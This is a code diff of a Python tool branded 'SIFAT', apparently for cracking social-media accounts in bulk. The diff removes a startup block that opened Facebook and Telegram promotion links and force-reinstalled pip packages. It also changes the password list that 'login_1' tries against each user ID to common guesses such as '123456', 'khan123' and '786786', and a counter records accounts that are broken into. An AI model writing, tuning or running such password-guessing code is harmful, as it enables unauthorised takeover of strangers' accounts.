@@ -32,19 +32,7 @@ from requests import api, models, sessions
 requests.urllib3.disable_warnings()
 
 
-# Initial setup and promotion
-os.system('clear')
-print(' \x1b[38;5;46mSIFAT SERVER LOADING....')
-os.system('espeak -a 300 " SIFAT SERVER LOADING"')
-os.system('xdg-open https://www.facebook.com/groups/1773489226765464/?ref=share&mibextid=NSMWBT')
-os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
-os.system('pip install httpx pip install beautifulsoup4')
-os.system('xdg-open https://t.me/hackerboysifat')
-print('loading Modules ...\n')
-os.system('clear')
-print(' \x1b[38;5;46mSIFAT SERVER SUCCESSFUL LOGIN....')
-os.system('espeak -a 300 " SIFAT SERVER SUCCESSFUL LOGIN."')
-os.system('xdg-open https://t.me/+py6X8MgncAQwODRl')
+
 
 
 # --- Anti-tampering and Security Checks ---
@@ -391,7 +379,7 @@ def login_1(uid):
     try:
         sys.stdout.write(f"\r\r\x1b[1;37m>\x1b[38;5;196m+\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mSIFAT-M1\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
         sys.stdout.flush()
-        for pw in ('123456', '1234567', '12345678', '123456789'):
+        for pw in ('123456', 'khan123', '786786', '123456789'):
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
@@ -483,4 +471,5 @@ def login_2(uid):
             pass
     loop += 1
 if __name__ == '__main__':
+
     BNG_71_()
